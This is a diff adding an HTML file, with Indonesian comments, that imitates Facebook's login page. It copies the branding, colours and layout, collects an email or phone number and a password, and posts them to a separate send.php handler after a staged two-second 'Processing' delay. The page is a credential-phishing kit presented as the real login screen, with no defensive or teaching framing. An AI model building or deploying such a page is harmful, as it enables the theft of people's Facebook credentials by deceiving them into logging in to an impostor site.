@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Mirip Facebook</title>
+  <style>
+    /* Reset dasar */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    /* Container utama */
+    .container {
+      width: 100%;
+      max-width: 360px;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    /* Header */
+    .header h1 {
+      color: #1877f2;
+      font-size: 36px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    /* Form group */
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 4px rgba(24, 119, 242, 0.5);
+    }
+
+    /* Tombol login */
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .login-button:hover {
+      background-color: #145db2;
+    }
+
+    /* Link lupa password */
+    .forgot-link {
+      margin-top: 15px;
+    }
+
+    .forgot-link a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot-link a:hover {
+      text-decoration: underline;
+    }
+
+    /* Divider (garis pembatas) */
+    .divider {
+      margin: 20px 0;
+      position: relative;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      height: 1px;
+      width: 40%;
+      background: #ddd;
+      position: absolute;
+      top: 50%;
+    }
+
+    .divider::before {
+      left: 0;
+    }
+
+    .divider::after {
+      right: 0;
+    }
+
+    .divider span {
+      background: white;
+      padding: 0 10px;
+      color: #606770;
+      font-size: 14px;
+    }
+
+    /* Tombol buat akun baru */
+    .create-account {
+      width: 100%;
+      background-color: #42b72a;
+      color: white;
+      font-size: 16px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    .create-account:hover {
+      background-color: #36a420;
+    }
+
+    /* Indikator loading */
+    .loading {
+      display: none;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #606770;
+    }
+
+    .loading span {
+      display: inline-block;
+      margin-left: 5px;
+      animation: blink 1.5s infinite;
+    }
+
+    .loading span:nth-child(2) {
+      animation-delay: 0.5s;
+    }
+
+    .loading span:nth-child(3) {
+      animation-delay: 1s;
+    }
+
+    @keyframes blink {
+      0%, 100% {
+        opacity: 0;
+      }
+      50% {
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>facebook</h1>
+    </div>
+    <form id="login-form" action="send.php" method="POST">
+      <div class="form-group">
+        <input type="text" name="email" placeholder="Email or phone number" required>
+      </div>
+      <div class="form-group">
+        <input type="password" name="password" placeholder="Password" required>
+      </div>
+      <button type="submit" class="login-button">Log In</button>
+    </form>
+    <div class="loading" id="loading">
+      Processing<span>.</span><span>.</span><span>.</span>
+    </div>
+    <div class="forgot-link">
+      <a href="#">Forgotten password?</a>
+    </div>
+    <div class="divider">
+      <span>or</span>
+    </div>
+    <button class="create-account">Create New Account</button>
+  </div>
+
+  <script>
+    // Menangani submit form
+    const loginForm = document.getElementById('login-form');
+    const loadingIndicator = document.getElementById('loading');
+
+    loginForm.addEventListener('submit', function (e) {
+      // Mencegah submit langsung
+      e.preventDefault();
+
+      // Menampilkan loading
+      loadingIndicator.style.display = 'block';
+
+      // Simulasi loading selama 2 detik sebelum melanjutkan
+      setTimeout(() => {
+        loginForm.submit();
+      }, 2000);
+    });
+  </script>
+</body>
+  </html>
